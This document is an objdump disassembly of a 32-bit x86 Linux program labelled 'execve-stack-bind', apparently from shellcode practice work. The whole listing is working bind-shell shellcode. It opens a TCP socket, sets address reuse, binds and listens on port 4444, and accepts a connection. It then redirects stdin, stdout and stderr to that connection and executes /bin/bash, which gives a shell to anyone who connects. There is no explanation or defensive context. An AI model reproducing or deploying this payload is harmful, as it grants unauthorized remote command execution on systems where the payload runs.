

execve-stack-bind:     file format elf32-i386


Disassembly of section .text:



08048060 <_start>:

 8048060:	31 c0                	xor    eax,eax

 8048062:	50                   	push   eax

 8048063:	66 b8 66 00          	mov    ax,0x66

 8048067:	31 db                	xor    ebx,ebx

 8048069:	b3 01                	mov    bl,0x1

 804806b:	6a 01                	push   0x1

 804806d:	6a 02                	push   0x2

 804806f:	89 e1                	mov    ecx,esp

 8048071:	cd 80                	int    0x80

 8048073:	89 c2                	mov    edx,eax

 8048075:	31 c0                	xor    eax,eax

 8048077:	66 b8 66 00          	mov    ax,0x66

 804807b:	31 db                	xor    ebx,ebx

 804807d:	b3 14                	mov    bl,0x14

 804807f:	6a 04                	push   0x4

 8048081:	54                   	push   esp

 8048082:	6a 02                	push   0x2

 8048084:	6a 01                	push   0x1

 8048086:	52                   	push   edx

 8048087:	89 e1                	mov    ecx,esp

 8048089:	cd 80                	int    0x80

 804808b:	31 c0                	xor    eax,eax

 804808d:	66 b8 66 00          	mov    ax,0x66

 8048091:	31 db                	xor    ebx,ebx

 8048093:	53                   	push   ebx

 8048094:	b3 02                	mov    bl,0x2

 8048096:	66 68 11 5c          	pushw  0x5c11

 804809a:	66 6a 02             	pushw  0x2

 804809d:	89 e1                	mov    ecx,esp

 804809f:	6a 16                	push   0x16

 80480a1:	51                   	push   ecx

 80480a2:	52                   	push   edx

 80480a3:	89 e1                	mov    ecx,esp

 80480a5:	cd 80                	int    0x80

 80480a7:	31 c0                	xor    eax,eax

 80480a9:	31 db                	xor    ebx,ebx

 80480ab:	53                   	push   ebx

 80480ac:	66 b8 66 00          	mov    ax,0x66

 80480b0:	b3 04                	mov    bl,0x4

 80480b2:	52                   	push   edx

 80480b3:	89 e1                	mov    ecx,esp

 80480b5:	cd 80                	int    0x80

 80480b7:	31 c0                	xor    eax,eax

 80480b9:	31 db                	xor    ebx,ebx

 80480bb:	53                   	push   ebx

 80480bc:	53                   	push   ebx

 80480bd:	66 b8 66 00          	mov    ax,0x66

 80480c1:	b3 05                	mov    bl,0x5

 80480c3:	52                   	push   edx

 80480c4:	89 e1                	mov    ecx,esp

 80480c6:	cd 80                	int    0x80

 80480c8:	89 c2                	mov    edx,eax

 80480ca:	31 c0                	xor    eax,eax

 80480cc:	31 c9                	xor    ecx,ecx

 80480ce:	b0 3f                	mov    al,0x3f

 80480d0:	89 d3                	mov    ebx,edx

 80480d2:	cd 80                	int    0x80

 80480d4:	31 c0                	xor    eax,eax

 80480d6:	31 c9                	xor    ecx,ecx

 80480d8:	b0 3f                	mov    al,0x3f

 80480da:	b1 01                	mov    cl,0x1

 80480dc:	cd 80                	int    0x80

 80480de:	31 c0                	xor    eax,eax

 80480e0:	b0 3f                	mov    al,0x3f

 80480e2:	b1 02                	mov    cl,0x2

 80480e4:	cd 80                	int    0x80

 80480e6:	31 c0                	xor    eax,eax

 80480e8:	50                   	push   eax

 80480e9:	68 62 61 73 68       	push   0x68736162

 80480ee:	68 62 69 6e 2f       	push   0x2f6e6962

 80480f3:	68 2f 2f 2f 2f       	push   0x2f2f2f2f

 80480f8:	89 e3                	mov    ebx,esp

 80480fa:	50                   	push   eax

 80480fb:	89 e2                	mov    edx,esp

 80480fd:	53                   	push   ebx

 80480fe:	89 e1                	mov    ecx,esp

 8048100:	b0 0b                	mov    al,0xb

 8048102:	cd 80                	int    0x80
